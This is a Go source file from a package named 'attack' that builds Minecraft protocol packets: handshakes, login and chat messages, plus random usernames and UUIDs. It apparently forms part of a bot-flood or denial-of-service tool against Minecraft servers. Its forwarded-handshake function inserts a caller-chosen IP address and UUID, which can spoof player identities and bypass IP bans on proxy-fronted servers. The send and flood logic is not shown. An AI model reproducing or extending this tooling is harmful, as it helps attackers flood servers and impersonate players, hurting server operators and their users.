package attack

import (
	crand "crypto/rand"
	"encoding/binary"
	"fmt"
	"math/rand"
)

// varint encodes an integer in Minecraft's variable-length format.
func varint(d int) []byte {
	var out []byte
	for {
		b := byte(d & 0x7F)
		d >>= 7
		if d != 0 {
			b |= 0x80
		}
		out = append(out, b)
		if d == 0 {
			break
		}
	}
	return out
}

func mcData(payload ...[]byte) []byte {
	var combined []byte
	for _, p := range payload {
		combined = append(combined, p...)
	}
	return append(varint(len(combined)), combined...)
}

func mcShort(n uint16) []byte {
	b := make([]byte, 2)
	binary.BigEndian.PutUint16(b, n)
	return b
}

func mcHandshake(host string, port uint16, protocolID, state int) []byte {
	return mcData(
		varint(0x00),
		varint(protocolID),
		mcData([]byte(host)),
		mcShort(port),
		varint(state),
	)
}

func mcHandshakeForwarded(host string, port uint16, protocolID, state int, fwdIP, uuid string) []byte {
	return mcData(
		varint(0x00),
		varint(protocolID),
		mcData([]byte(host), []byte("\x00"), []byte(fwdIP), []byte("\x00"), []byte(uuid)),
		mcShort(port),
		varint(state),
	)
}

func mcLogin(protocol int, username string) []byte {
	packetID := 0x00
	if protocol >= 385 && protocol < 391 {
		packetID = 0x01
	}
	return mcData(varint(packetID), mcData([]byte(username)))
}

func mcChat(protocol int, message string) []byte {
	var packetID int
	switch {
	case protocol >= 755:
		packetID = 0x03
	case protocol >= 464:
		packetID = 0x03
	case protocol >= 343:
		packetID = 0x01
	case protocol >= 318:
		packetID = 0x03
	case protocol >= 107:
		packetID = 0x02
	default:
		packetID = 0x01
	}
	return mcData(varint(packetID), mcData([]byte(message)))
}

func randStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func randUUID() string {
	b := make([]byte, 16)
	_, _ = crand.Read(b)
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}
